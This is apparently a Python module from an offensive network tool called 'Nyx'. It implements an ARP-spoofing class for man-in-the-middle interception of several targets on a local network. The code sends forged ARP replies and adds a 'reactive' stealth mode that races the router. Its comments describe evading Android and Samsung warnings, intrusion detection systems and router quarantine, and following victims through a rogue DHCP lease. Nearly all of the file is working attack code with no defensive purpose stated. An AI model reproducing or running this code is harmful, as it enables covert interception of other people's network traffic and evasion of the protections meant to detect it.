import asyncio
import logging
import platform
import random
import socket
import subprocess
import time

logger = logging.getLogger(__name__)


def _get_local_ip(remote_host: str = "8.8.8.8") -> str:
    # Method 1: connect to remote host
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((remote_host, 80))
            ip = s.getsockname()[0]
            if ip != "127.0.0.1":
                return ip
    except Exception as e:
        logger.debug("Method 1 (UDP connect) failed: %s", e)
    # Method 2: hostname lookup
    try:
        ip = socket.gethostbyname(socket.gethostname())
        if ip != "127.0.0.1":
            return ip
    except Exception as e:
        logger.debug("Method 2 (hostname) failed: %s", e)
    # Method 3: parse ipconfig/ifconfig
    sys_platform = platform.system().lower()
    try:
        if sys_platform == "windows":
            out = subprocess.check_output("ipconfig", shell=True, timeout=5).decode("utf-8", errors="replace")
            for line in out.splitlines():
                if "IPv4" in line or "IP Address" in line:
                    parts = line.strip().split(":")
                    if len(parts) >= 2:
                        ip = parts[1].strip()
                        if ip and not ip.startswith("127."):
                            return ip
        elif sys_platform == "linux":
            out = subprocess.check_output(["hostname", "-I"], timeout=5).decode("utf-8", errors="replace")
            ips = out.strip().split()
            for ip in ips:
                if ip and not ip.startswith("127."):
                    return ip
        elif sys_platform == "darwin":
            out = subprocess.check_output(["ifconfig"], timeout=5).decode("utf-8", errors="replace")
            for line in out.splitlines():
                if "inet " in line and "127.0.0.1" not in line:
                    parts = line.strip().split()
                    for i, p in enumerate(parts):
                        if p == "inet" and i + 1 < len(parts):
                            return parts[i + 1]
    except Exception as e:
        logger.debug("Method 3 (ipconfig/ifconfig) failed: %s", e)
    return "127.0.0.1"


def _get_mac(ip: str, timeout: float = 1.5) -> str | None:
    try:
        from scapy.all import ARP, Ether, srp
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except Exception as e:
        logger.debug("Failed to get MAC for %s: %s", ip, e)
    return None


def _get_hostname(ip: str) -> str | None:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception as e:
        logger.debug("Hostname lookup failed for %s: %s", ip, e)
        return None


class ARPSpoofer:
    """Sends forged ARP packets to perform a man-in-the-middle attack on multiple targets.

    Two operational modes:

    ``mode="active"`` (default)
        Periodically floods the target with spoofed ARP replies claiming the
        gateway is at our MAC. Simple and reliable, but the steady ARP stream
        is what Samsung "sospetta attività" / Android's Wi-Fi privacy
        warnings detect.

    ``mode="reactive"`` (stealth)
        Sends NOTHING until the target itself asks "who is the gateway?".
        We sniff for ARP who-has requests from the target toward the gateway
        and answer immediately with a forged reply (a race we win because we
        are on the LAN and reply faster than the router). Because the reply
        is a direct answer to a genuine request, it looks like normal ARP
        traffic — there is no periodic flood to pattern-match, so Samsung /
        Android detection heuristics (which look for *unsolicited* spoofed
        replies) are far less likely to fire. A slow keep-alive (every 30s)
        re-arms the target's cache only when it has gone quiet for a while.

    ``mode="ra"`` (IPv6 Router Advertisement spoofing)
        Declares THIS machine as the IPv6 router via forged Router
        Advertisements, so the target routes all IPv6 traffic through us
        without any NDP poisoning. Used when the target has IPv6.

    Stealth improvements vs naive implementation:
    - Randomised interval (base ± jitter) prevents timing-based IDS detection.
    - Restore sends 3 gratuitous ARP packets per target (vs 1) to ensure
      the target's ARP table is actually corrected on teardown.
    """

    # Base interval between ARP poison rounds (seconds)
    _BASE_INTERVAL: float = 3.0
    # Maximum random jitter added/subtracted from the base interval
    _JITTER: float = 1.5
    # Reactive mode: re-arm target's cache after this many quiet seconds
    _REACTIVE_REFILL: float = 30.0

    def __init__(
        self,
        target_ips: list[str],
        gateway_ip: str | None = None,
        interval: float = 3.0,
        spoof_gateway_cache: bool = False,
        mode: str = "active",
    ):
        """``spoof_gateway_cache=False`` (default) poisons ONLY the target's ARP
        cache: the target sends everything to us, and the router answers the
        target directly. This halves the attacker's fingerprint: modern APs /
        routers detect when a client claims to *be* another client
        (gateway-cache poisoning) and quarantine the attacker machine — which
        also kills the attacker's own connectivity. Burp-style MITM traffic
        (target -> us -> gateway) works fine with target-only poisoning; set
        ``True`` only if you also need to capture the responses.

        ``mode`` selects the poisoning strategy — see class docstring.
        """
        self.target_ips = target_ips
        self.gateway_ip = gateway_ip or self._detect_gateway()
        self.interval = interval
        self.spoof_gateway_cache = spoof_gateway_cache
        self.mode = mode
        self._running = False
        self._task: asyncio.Task | None = None
        self._sniff_task: asyncio.Task | None = None
        self._local_ip = _get_local_ip()
        self._local_mac: str | None = None
        # Timestamp of the last successful poison round — lets the UI tell a
        # live spoofer from a dead one.
        self.last_send_ts: float | None = None

    def add_target(self, ip: str):
        """Dynamically add a target (e.g. the NEW IP a target receives from
        the rogue DHCP lease) so poisoning follows the device."""
        if ip and ip not in self.target_ips:
            self.target_ips.append(ip)
            logger.info("ARP spoofer: added target %s", ip)

    @staticmethod
    def _detect_gateway() -> str | None:
        sys_platform = platform.system().lower()
        try:
            if sys_platform == "windows":
                out = subprocess.check_output("route print 0.0.0.0", shell=True).decode("utf-8", errors="replace")
                for line in out.splitlines():
                    parts = line.strip().split()
                    if len(parts) >= 3 and parts[0] == "0.0.0.0":
                        return parts[2]
            elif sys_platform == "linux":
                out = subprocess.check_output("ip route show default", shell=True).decode("utf-8", errors="replace")
                parts = out.strip().split()
                for i, p in enumerate(parts):
                    if p == "via":
                        return parts[i + 1]
            else:
                out = subprocess.check_output("netstat -rn", shell=True).decode("utf-8", errors="replace")
                for line in out.splitlines():
                    if line.startswith("default"):
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            return parts[1]
        except Exception as e:
            logger.debug("Gateway detection failed: %s", e)
        return None

    async def start(self):
        if self._running:
            return
        self._running = True
        self._local_mac = await asyncio.to_thread(_get_mac, self._local_ip)
        if not self._local_mac:
            logger.warning("Could not determine local MAC address")
        self._task = asyncio.create_task(self._spoof_loop())
        if self.mode == "reactive":
            # sniff() is blocking; run it in a thread and poll it from asyncio
            self._sniff_task = asyncio.create_task(
                asyncio.to_thread(self._reactive_sniffer)
            )
            logger.info("ARP spoofer in REACTIVE (stealth) mode — only answering ARP who-has for the gateway")

    async def stop(self):
        self._running = False
        if self._sniff_task:
            self._sniff_task.cancel()
            try:
                await self._sniff_task
            except asyncio.CancelledError:
                pass
            self._sniff_task = None
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
            self._task = None
        await self._restore_arp()

    def _send_arp(self, target_ip: str, spoof_ip: str, target_mac: str | None = None):
        try:
            from scapy.all import ARP, send
            pkt = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac or "ff:ff:ff:ff:ff:ff")
            send(pkt, verbose=0)
            logger.info("ARP sent: %s -> %s (spoofing %s)", target_ip, target_mac or "broadcast", spoof_ip)
        except PermissionError:
            logger.error("ARP spoofing requires admin/root privileges. Run Nyx as administrator.")
        except Exception as e:
            logger.warning("ARP send failed for %s: %s", target_ip, e)

    async def _spoof_loop(self):
        while self._running:
            try:
                if self.mode == "reactive":
                    # In reactive mode the sniffer handles the live answers.
                    # This loop is only a slow keep-alive: if the target has
                    # been quiet for a while, re-arm its cache once so the
                    # first request after a long idle still hits us.
                    await asyncio.sleep(self._REACTIVE_REFILL)
                    if not self._running:
                        break
                    for target_ip in self.target_ips:
                        self._send_arp(target_ip, self.gateway_ip, None)
                    self.last_send_ts = time.time()
                    continue

                # ── Active mode: periodic poisoning (original behaviour) ──
                # Resolve every target MAC in parallel: a single unresponsive
                # target must not stall the poison round for the others (each
                # failed probe costs up to its full timeout).
                target_macs = await asyncio.gather(
                    *(asyncio.to_thread(_get_mac, ip) for ip in self.target_ips)
                )
                gateway_mac = None
                if self.spoof_gateway_cache:
                    gateway_mac = await asyncio.to_thread(_get_mac, self.gateway_ip)
                    if not gateway_mac:
                        logger.warning("Could not resolve MAC for gateway %s", self.gateway_ip)
                for target_ip, target_mac in zip(self.target_ips, target_macs):
                    if not target_mac:
                        logger.warning("Could not resolve MAC for target %s — sending broadcast", target_ip)
                    # Claim the gateway is at our MAC (target's cache).
                    self._send_arp(target_ip, self.gateway_ip, target_mac)
                    # Optionally claim the target is at our MAC (router's cache).
                    # Off by default: routers detect gateway-cache poisoning and
                    # quarantine the attacker, killing the attacker's own
                    # connectivity. Target-only poisoning keeps the flow
                    # target -> us -> gateway, which is all the proxy needs.
                    if self.spoof_gateway_cache:
                        self._send_arp(self.gateway_ip, target_ip, gateway_mac)
                self.last_send_ts = time.time()
            except Exception as e:
                logger.warning("Spoof iteration error: %s", e)

            if self.mode == "reactive":
                continue

            # Randomised sleep: base interval ± jitter to avoid timing-based IDS
            jitter = random.uniform(-self._JITTER, self._JITTER)
            sleep_time = max(1.0, self._BASE_INTERVAL + jitter)
            await asyncio.sleep(sleep_time)

    def _reactive_sniffer(self):
        """Sniff ARP who-has requests from targets asking for the gateway and
        answer them with a forged reply claiming the gateway is at our MAC.

        Runs in a thread (scapy's sniff is blocking); the loop polls a flag
        and stops when ``_running`` is cleared.
        """
        from scapy.all import ARP, Ether, sendp, sniff
        target_set = set(self.target_ips)

        def _answer(pkt):
            if not self._running:
                return
            try:
                if ARP not in pkt:
                    return
                arp = pkt[ARP]
                # Only answer who-has requests (op=1) from OUR targets
                # asking about the gateway.
                if arp.op != 1:
                    return
                if arp.psrc not in target_set:
                    return
                if arp.pdst != self.gateway_ip:
                    return
                # Race the router: reply directly (unicast to the target)
                # claiming the gateway lives at our MAC.
                if not self._local_mac:
                    return
                reply = (
                    Ether(dst=pkt[Ether].src)
                    / ARP(op=2, pdst=arp.psrc, psrc=self.gateway_ip,
                         hwdst=arp.psrc, hwsrc=self._local_mac)
                )
                sendp(reply, verbose=0)
                self.last_send_ts = time.time()
                logger.info(
                    "Reactive ARP reply: %s asked for gateway %s -> answered with our MAC",
                    arp.psrc, self.gateway_ip,
                )
            except Exception as e:
                logger.warning("Reactive ARP answer failed: %s", e)

        try:
            sniff(filter="arp", prn=_answer, store=0, stop_filter=lambda p: not self._running)
        except Exception as e:
            logger.warning("Reactive ARP sniffer stopped: %s", e)
        finally:
            # If sniff exits unexpectedly (e.g. interface dropped), restart it
            # as long as we're still running — self-healing.
            if self._running:
                logger.info("Reactive ARP sniffer exited — restarting")
                try:
                    sniff(filter="arp", prn=_answer, store=0, stop_filter=lambda p: not self._running)
                except Exception as e2:
                    logger.warning("Reactive ARP sniffer restart failed: %s", e2)

    async def _restore_arp(self):
        """Send gratuitous ARP to restore correct mappings.

        Sends each packet 3 times with a small delay to ensure delivery even
        on lossy links. A single packet is often dropped and leaves the target
        with stale ARP entries.

        CRITICAL: every restore packet must explicitly claim the REAL gateway
        and target MACs via ``hwsrc``. scapy auto-fills an unset ``hwsrc``
        with THIS machine's MAC, so a "restore" built like the attack packets
        would re-poison the target's cache and newly poison the router's —
        leaving the target blackholed after the MITM stops and triggering
        "suspicious network activity" alerts on the phone.
        """
        try:
            gateway_mac = await asyncio.to_thread(_get_mac, self.gateway_ip)
            if not gateway_mac:
                logger.warning(
                    "Could not resolve MAC for gateway %s — cannot restore ARP",
                    self.gateway_ip,
                )
            for target_ip in self.target_ips:
                target_mac = await asyncio.to_thread(_get_mac, target_ip)
                if target_mac and gateway_mac:
                    from scapy.all import ARP, send
                    # Send 3 times for reliability
                    for _ in range(3):
                        # Target: "the gateway is at the REAL router's MAC".
                        send(
                            ARP(op=2, pdst=target_ip, psrc=self.gateway_ip,
                                hwdst=target_mac, hwsrc=gateway_mac),
                            verbose=0,
                        )
                        # Router: "the target is at its own MAC" (harmless when
                        # the router's cache was never poisoned).
                        send(
                            ARP(op=2, pdst=self.gateway_ip, psrc=target_ip,
                                hwdst=gateway_mac, hwsrc=target_mac),
                            verbose=0,
                        )
                        await asyncio.sleep(0.1)
                    logger.info("ARP restored for %s (3x)", target_ip)
                else:
                    logger.warning(
                        "Cannot restore ARP for %s (target MAC: %s, gateway MAC: %s)",
                        target_ip, target_mac, gateway_mac,
                    )
        except Exception as e:
            logger.debug("ARP restore failed: %s", e)
